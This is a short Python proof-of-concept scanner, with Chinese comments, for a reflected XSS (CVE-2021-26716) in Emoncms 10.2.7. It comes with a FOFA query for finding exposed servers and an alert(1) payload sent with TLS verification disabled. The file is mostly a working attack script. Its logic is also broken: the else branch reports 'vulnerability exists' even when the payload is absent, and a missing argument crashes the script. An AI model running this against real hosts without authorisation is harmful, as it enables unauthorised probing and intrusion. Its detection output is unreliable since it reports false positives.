#!/usr/bin/python3
# -*- coding: utf-8 -*-
#Emoncms 10.2.7 node参数 反射型XSS（CVE-2021-26716）
#FOFA：app="Emoncms-user-login"
#ref: https://github.com/emoncms/emoncms/issues/1652


import ssl
from urllib import request
import sys 

def xss_poc(url):
    ssl._create_default_https_context = ssl._create_unverified_context
    target = url + r'/Modules/input/Views/schedule.php?node=1";alert(1);var%20x="l'
    try:
        req = request.Request(target) # 发送请求
        result = request.urlopen(req).read()
        if b'";alert(1);var%20x="l' in result:
            print("%s 漏洞存在" % url)
            print("payload:\n",target)
        else:
            print("%s 漏洞存在"% url)
    except Exception as e:
        print('漏洞不存在或有waf')
        print(e)
       





argvs = sys.argv
if len(argvs) == 2:
    url = argvs[1]
else:
    print('unsage: python %s url'% argvs[0])
xss_poc(url)